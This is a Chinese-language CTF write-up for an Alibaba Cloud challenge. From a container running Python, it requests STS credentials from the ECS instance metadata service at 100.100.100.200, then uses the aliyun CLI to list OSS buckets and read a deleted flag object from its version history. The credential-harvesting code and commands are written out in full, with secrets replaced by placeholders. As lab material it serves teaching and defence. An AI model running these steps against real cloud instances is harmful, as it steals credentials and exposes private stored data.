# SU_easyk8s_on_aliyun

## 题目简述

题目延续了可执行 Python 代码的云上容器场景。Python 解释器本身能够访问网络，但容器内没有可直接读取的 flag。关键在于运行环境位于阿里云 ECS 上，并绑定了名为 `oss-root` 的 RAM Role。

攻击链为：

1. 从 ECS 实例元数据服务读取 RAM Role 名称；
2. 获取该角色的短期 STS 凭据；
3. 使用临时身份枚举 OSS Bucket 及对象历史版本；
4. 绕过当前对象已删除的表象，按 `version-id` 读取旧版本的 `oss-flag`。

题目仓库中的赛时示例包含已经失效的临时凭据。临时 AccessKey、Secret 和 SecurityToken 不应复制到题解或脚本中，下面统一使用占位符。

## 解题过程

### 1. 访问 ECS 实例元数据

阿里云 ECS 实例元数据服务的地址为 `100.100.100.200`。先请求角色列表：

```python
import requests

base = "http://100.100.100.200/latest/meta-data/"

role = requests.get(
    base + "ram/security-credentials/",
    timeout=3,
).text.strip()

print(role)
```

赛时返回的角色名为：

```text
oss-root
```

再以该角色名请求临时身份：

```python
credentials = requests.get(
    base + "ram/security-credentials/" + role,
    timeout=3,
).json()

print(credentials["Code"])
print(credentials["Expiration"])
```

成功响应中包含以下字段：

```json
{
  "AccessKeyId": "<temporary-access-key-id>",
  "AccessKeySecret": "<temporary-access-key-secret>",
  "SecurityToken": "<temporary-security-token>",
  "Expiration": "<expiration-time>",
  "Code": "Success"
}
```

这里取得的是有明确过期时间的 STS 临时身份，而不是长期用户密钥。实际操作时应避免打印或落盘保存这三个敏感字段。

### 2. 使用 STS 身份访问 OSS

用阿里云 CLI 选择 `StsToken` 模式：

```bash
aliyun configure --mode StsToken
```

根据提示输入刚取得的临时 `AccessKeyId`、`AccessKeySecret` 和 `SecurityToken`，然后先做只读枚举：

```bash
aliyun oss ls
```

赛时可见目标 Bucket：

```text
oss://suctf-flag-bucket
```

如果直接列当前对象，看不到 flag，不能据此判断对象从未存在。OSS Bucket 开启版本控制后，删除操作通常会产生删除标记，旧的数据版本仍然保留。使用 `--all-versions` 查看完整历史：

```bash
aliyun oss ls \
  oss://suctf-flag-bucket \
  --all-versions
```

输出中可以找到键名为 `oss-flag` 的旧版本及其 `version-id`。

### 3. 按历史版本读取对象

将枚举到的真实版本号代入读取命令：

```bash
aliyun oss cat \
  oss://suctf-flag-bucket/oss-flag \
  --version-id "<version-id>"
```

这样请求的是删除标记之前的具体数据版本，不受对象当前“已删除”状态影响，响应正文即为赛时 flag。

仓库仅保存了赛时操作记录和示例文件，没有保留可再次访问的云环境；临时凭据也早已过期。因此能够从现有材料确认攻击链和取证位置，但不能把历史云端读取重新验证为当前仍可执行，也不应将仓库中的占位或环境文件误当作赛时 flag。

## 方法总结

本题的核心不是 Python 代码执行本身，而是云工作负载身份向对象存储权限的传播：

```text
可联网的执行环境
    -> ECS 元数据服务
    -> RAM Role 的短期 STS 身份
    -> OSS Bucket 枚举
    -> 对象历史版本
    -> 已删除的 flag 数据
```

遇到类似云题，应分别记录身份主体、凭据类型、过期时间、实际权限和目标资源。对象存储开启版本控制后，“当前列表中不存在”并不等于“数据已经不可恢复”；还要检查删除标记、历史版本和生命周期策略。与此同时，题解中应删除临时 Secret 与 Token，只保留字段结构和复现步骤。
